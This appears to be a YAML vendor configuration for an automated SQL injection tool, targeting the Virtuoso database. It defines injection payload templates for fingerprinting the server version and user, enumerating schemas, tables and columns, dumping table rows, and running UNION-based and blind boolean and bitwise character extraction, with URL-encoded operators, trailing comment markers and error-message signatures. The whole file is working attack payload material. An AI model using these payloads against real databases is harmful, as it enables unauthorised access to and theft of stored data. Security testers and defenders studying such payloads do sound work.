vendor: Virtuoso

resource:
 info: |
  select 
      sys_stat('st_dbms_ver')
      || '${enclose_value_sql}'
      || sys_stat('st_dbms_name')
      || '${enclose_value_sql}'
      || username() 
      || '${trail_sql}'

 schema:
  database: |  
   select
       '${enclose_value_sql}'
       || r
       || '${separator_qte_sql}'
       || q
       || '${enclose_value_sql}'
   from (
       select ${limit}
           tables.table_schema r,
           count(table_name) q
       from information_schema.tables
       group by r
       order by r
   ) x

  table: |
   select
       '${enclose_value_sql}'
       || r
       || '${separator_qte_sql}'
       || q
       || '${enclose_value_sql}'
   from (
       select ${limit}
           tables.table_name r,
           '0' q
       from information_schema.tables
       where tables.table_schema = '${database}'
       group by r
       order by r
   ) x

  column: |
   select
       '${enclose_value_sql}'
       || r
       || '${separator_qte_sql}'
       || q
       || '${enclose_value_sql}'
   from (
       select ${limit}
           columns.column_name r,
           '0' q
       from information_schema.columns
       where columns.table_schema = '${database}'
       and columns.table_name = '${table}'
       group by r
       order by r
   ) x

  row:
   query: |
    select
        '${enclose_value_sql}'
        || r
        || '${separator_qte_sql}'
        || q
        || '${enclose_value_sql}'
    from (    
        select ${limit}
        (${fields}) r,
        count(*) q
        from ${database}.${table}
        group by r
    ) x
   fields:
    field: |
     ${field.value}
    concat: "|| '%7f' ||"

strategy:
 configuration:
  slidingWindow: |
   select
       '${lead}'
       || substring(
           (${injection}),
           ${window.char},
           65536
       )
       || '${trail_sql}'
  limit: top ${limit.value}, 1
  failsafe: cast((1337${indice}7330%2b1) as varchar)
  calibrator: repeat('${calibrator_sql}', 65535)
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    - virtuoso
   orderByErrorMessage:
    - index of column in order by out of range
   vendorSpecific: "'a' = case when ${test} then 'a' else sys_stat('st_dbms_ver') end"

 union:
  indices: union select ${indices} from (select 1 a)x
  capacity: (select '${lead}' || ${indice} || ${calibrator})
  orderBy: order by 1337

 binary:
  test:
   bit: |
    not 0 = bit_and(ascii(
        substring(
            (${injection}),
            ${window.char},
            1
        )
    ), ${bit})
   bin: |
    substring(
        (${injection}),
        ${window.char},
        1
    )
    %3E%3Dchr(${mid.int})
   truthyBin:
    - chr(97)%3E%3Dchr(97)
    - chr(97)%3E%3Dchr(65)
    - chr(97)%3E%3Dchr(48)
    - chr(98)%3E%3Dchr(97)
    - chr(98)%3E%3Dchr(66)
    - chr(49)%3E%3Dchr(48)
   falsyBin:
    - chr(97)%3E%3Dchr(98)
    - chr(65)%3E%3Dchr(97)
    - chr(66)%3E%3Dchr(98)
    - chr(66)%3E%3Dchr(97)
    - chr(48)%3E%3Dchr(65)
    - chr(48)%3E%3Dchr(49)
   truthyBit:
    - 0 = 0
    - "not 'a' = 'b'"
    - "'a' = 'a'"
    - 1 = 1
    - 2 = 2
    - not 1 = 2
   falsyBit:
    - 1 = 0
    - "not 'a' = 'a'"
    - "not 'b' = 'b'"
    - 1 = 2
    - not 1 = 1
    - not 2 = 2
  modeAnd: and
  modeOr: or
  blind: ${binary.mode} ${test}